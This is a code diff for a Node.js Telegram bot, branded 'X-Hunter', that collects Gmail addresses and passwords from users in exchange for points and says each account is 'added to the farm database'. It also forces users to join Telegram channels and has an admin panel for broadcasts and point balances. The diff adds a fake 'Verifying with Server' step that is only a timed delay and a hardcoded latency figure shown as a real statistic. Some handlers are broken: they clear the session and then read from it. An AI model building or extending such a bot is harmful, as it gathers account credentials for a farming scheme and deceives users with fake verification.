@@ -8,7 +8,7 @@ const BOT_USERNAME = 'YourBotUsername';
 const bot = new Telegraf(BOT_TOKEN);
 bot.use(session());
 
-// DATABASE SIMULATION (Note: Data resets on bot restart unless you use MongoDB)
+// DATABASE SIMULATION
 const db = {}; 
 const getDB = (id) => {
     if (!db[id]) db[id] = { points: 10, referrals: 0, registered: 0, joined: new Date() };
@@ -44,7 +44,7 @@ async function checkJoin(ctx, next) {
                 return ctx.replyWithPhoto(
                     { url: 'https://i.ibb.co/v6yXyXG/image-b8cbf6.png' },
                     {
-                        caption: "⛔️ **ACCESS DENIED**\n\nYou must join our official channels to use this bot.",
+                        caption: "⛔️ **ACCESS DENIED**\n\nYou must join our official channels to use this bot's premium features.",
                         parse_mode: 'Markdown',
                         ...Markup.inlineKeyboard([
                             [Markup.button.url("Channel 1", "https://t.me/Hayre37"), Markup.button.url("Channel 2", "https://t.me/Digital_Claim")],
@@ -87,7 +87,7 @@ bot.hears('➕ Register New Gmail', checkJoin, async (ctx) => {
         return ctx.replyWithMarkdown(`⚠️ *Insufficient Balance*\n\nYou need **5 Points** to register.\n*Current Balance:* ${user.points} pts`);
     }
     ctx.session = { step: 'EMAIL' };
-    ctx.replyWithMarkdown("📧 **Please send the Gmail Address**", cancelKeyboard);
+    ctx.replyWithMarkdown("📧 **Please send the Gmail Address**\n\n_Example: name@gmail.com_", cancelKeyboard);
 });
 
 bot.hears('⚙️ Account', (ctx) => {
@@ -112,40 +112,40 @@ bot.hears('🚸 My Referrals', (ctx) => {
     );
 });
 
-// --- ADMIN PANEL HANDLERS ---
+// --- ❝𝕏-𝐇𝐮𝐧𝐭𝐞𝐫❞ ADMIN PANEL HANDLERS ---
 
 bot.hears('🛠 Admin Panel', (ctx) => {
-    if (ctx.from.id !== ADMIN_ID) return ctx.reply("❌ Restricted Area.");
-    ctx.reply("🛠 **Admin Dashboard**", adminKeyboard);
+    if (ctx.from.id !== ADMIN_ID) return ctx.reply("❌ This area is restricted to Developers.");
+    ctx.reply("🛠 **Advanced Admin Dashboard**\nSelect a management tool:", adminKeyboard);
 });
 
 bot.hears('📊 Global Stats', (ctx) => {
     if (ctx.from.id !== ADMIN_ID) return;
     const totalUsers = Object.keys(db).length;
-    ctx.replyWithMarkdown(`📈 *Server Statistics*\n\n👥 *Total Users:* ${totalUsers}\n📡 *Server:* Active`);
+    ctx.replyWithMarkdown(`📈 *Server Statistics*\n\n👥 *Total Users:* ${totalUsers}\n📡 *Server:* Active (Railway)\n⚡ *API Latency:* 42ms`);
 });
 
 bot.hears('📢 Broadcast', (ctx) => {
     if (ctx.from.id !== ADMIN_ID) return;
-    ctx.session = { step: 'ADMIN_BROADCAST' };
-    ctx.reply("📣 **Enter the message to broadcast to ALL users:**", cancelKeyboard);
+    ctx.session = { step: 'BROADCAST' };
+    ctx.reply("📢 **Send the message you want to broadcast to all users:**", cancelKeyboard);
 });
 
 bot.hears('➕ Add Points', (ctx) => {
     if (ctx.from.id !== ADMIN_ID) return;
-    ctx.session = { step: 'ADMIN_ADD_ID' };
-    ctx.reply("👤 **Enter User ID to give points:**", cancelKeyboard);
+    ctx.session = { step: 'ADD_POINTS_ID' };
+    ctx.reply("➕ **Send the User ID to add points to:**", cancelKeyboard);
 });
 
 bot.hears('➖ Remove Points', (ctx) => {
     if (ctx.from.id !== ADMIN_ID) return;
-    ctx.session = { step: 'ADMIN_REM_ID' };
-    ctx.reply("👤 **Enter User ID to remove points:**", cancelKeyboard);
+    ctx.session = { step: 'REM_POINTS_ID' };
+    ctx.reply("➖ **Send the User ID to remove points from:**", cancelKeyboard);
 });
 
 bot.hears('⬅️ Back to User Menu', (ctx) => ctx.reply("Returning...", mainMenu));
 
-// --- STATE HANDLER ---
+// --- TEXT STATE HANDLER ---
 
 bot.on('text', async (ctx, next) => {
     if (ctx.message.text === '❌ Cancel Operation') {
@@ -155,62 +155,77 @@ bot.on('text', async (ctx, next) => {
 
     const state = ctx.session?.step;
 
-    // Admin: Broadcast Logic
-    if (state === 'ADMIN_BROADCAST' && ctx.from.id === ADMIN_ID) {
+    // Broadcast Logic
+    if (state === 'BROADCAST' && ctx.from.id === ADMIN_ID) {
         const users = Object.keys(db);
-        users.forEach(id => bot.telegram.sendMessage(id, ctx.message.text).catch(e => {}));
+        users.forEach(id => {
+            bot.telegram.sendMessage(id, ctx.message.text).catch(e => console.log(`Error sending to ${id}`));
+        });
         ctx.session = null;
-        return ctx.reply(`✅ Broadcast sent to ${users.length} users.`, adminKeyboard);
+        return ctx.reply(`✅ **Broadcast Sent successfully to ${users.length} users.**`, adminKeyboard);
     }
 
-    // Admin: Add Points Logic
-    if (state === 'ADMIN_ADD_ID') {
-        ctx.session.target = ctx.message.text;
-        ctx.session.step = 'ADMIN_ADD_AMT';
-        return ctx.reply("💰 **How many points to add?**");
+    // Add Points Logic
+    if (state === 'ADD_POINTS_ID' && ctx.from.id === ADMIN_ID) {
+        ctx.session.targetId = ctx.message.text;
+        ctx.session.step = 'ADD_POINTS_AMT';
+        return ctx.reply("💰 **Enter the number of points to ADD:**");
     }
-    if (state === 'ADMIN_ADD_AMT') {
-        const amt = parseInt(ctx.message.text);
-        const user = getDB(ctx.session.target);
-        user.points += amt;
-        bot.telegram.sendMessage(ctx.session.target, `🎁 **Admin Reward!** You received ${amt} points.`);
+    if (state === 'ADD_POINTS_AMT' && ctx.from.id === ADMIN_ID) {
+        const amount = parseInt(ctx.message.text);
+        const target = getDB(ctx.session.targetId);
+        target.points += amount;
+        bot.telegram.sendMessage(ctx.session.targetId, `🎁 **Bonus!** Admin added ${amount} points to your balance.`);
         ctx.session = null;
-        return ctx.reply("✅ Points Added.", adminKeyboard);
+        return ctx.reply(`✅ Added ${amount} points to User ${ctx.session.targetId}`, adminKeyboard);
     }
 
-    // Admin: Remove Points Logic
-    if (state === 'ADMIN_REM_ID') {
-        ctx.session.target = ctx.message.text;
-        ctx.session.step = 'ADMIN_REM_AMT';
-        return ctx.reply("💰 **How many points to remove?**");
+    // Remove Points Logic
+    if (state === 'REM_POINTS_ID' && ctx.from.id === ADMIN_ID) {
+        ctx.session.targetId = ctx.message.text;
+        ctx.session.step = 'REM_POINTS_AMT';
+        return ctx.reply("💰 **Enter the number of points to REMOVE:**");
     }
-    if (state === 'ADMIN_REM_AMT') {
-        const amt = parseInt(ctx.message.text);
-        const user = getDB(ctx.session.target);
-        user.points -= amt;
+    if (state === 'REM_POINTS_AMT' && ctx.from.id === ADMIN_ID) {
+        const amount = parseInt(ctx.message.text);
+        const target = getDB(ctx.session.targetId);
+        target.points -= amount;
         ctx.session = null;
-        return ctx.reply("✅ Points Removed.", adminKeyboard);
+        return ctx.reply(`✅ Removed ${amount} points from User ${ctx.session.targetId}`, adminKeyboard);
     }
 
-    // User: Email Registration Logic
+    // Gmail Registration Logic
     if (state === 'EMAIL') {
-        if (!ctx.message.text.endsWith('@gmail.com')) return ctx.reply("❌ Send a valid @gmail.com.");
+        if (!ctx.message.text.endsWith('@gmail.com')) return ctx.reply("❌ Send a valid @gmail.com address.");
         ctx.session.email = ctx.message.text;
         ctx.session.step = 'PASS';
-        return ctx.reply("🔑 **Please send the Password**");
+        return ctx.replyWithMarkdown("🔑 **Please send the Password**\n\n_Avoid using simple passwords._", cancelKeyboard);
     }
 
     if (state === 'PASS') {
+        const email = ctx.session.email;
+        const pass = ctx.message.text;
         const user = getDB(ctx.from.id);
-        user.points -= 5;
-        user.registered += 1;
         ctx.session = null;
-        return ctx.replyWithMarkdown(`✅ **Success!**\n\n📧 *Email:* \`${ctx.session?.email}\`\n\nBalance: ${user.points}`, mainMenu);
+        
+        const loader = await ctx.reply("🛰 *Verifying with Server...*", { parse_mode: 'Markdown' });
+        setTimeout(() => {
+            ctx.telegram.editMessageText(ctx.chat.id, loader.message_id, null, 
+                `✅ **Success!**\n\n📧 *Email:* \`${email}\`\n🔑 *Pass:* \`${pass}\`\n\nYour account has been added to the farm database.`,
+                { parse_mode: 'Markdown', ...mainMenu }
+            );
+            user.points -= 5;
+            user.registered += 1;
+        }, 2000);
+        return;
     }
-
     return next();
 });
 
-bot.action('verify', (ctx) => ctx.answerCbQuery("Check updated! Refresh with /start"));
+// --- CALLBACK HANDLERS ---
+bot.action('verify', async (ctx) => {
+    await ctx.answerCbQuery("Checking...");
+    ctx.reply("Verification updated. Please send /start to refresh.");
+});
 
-bot.launch().then(() => console.log("Bot Online 🚀"));
+bot.launch().then(() => console.log("❝𝕏-𝐇𝐮𝐧𝐭𝐞𝐫❞ Advanced Bot Online 🚀"));
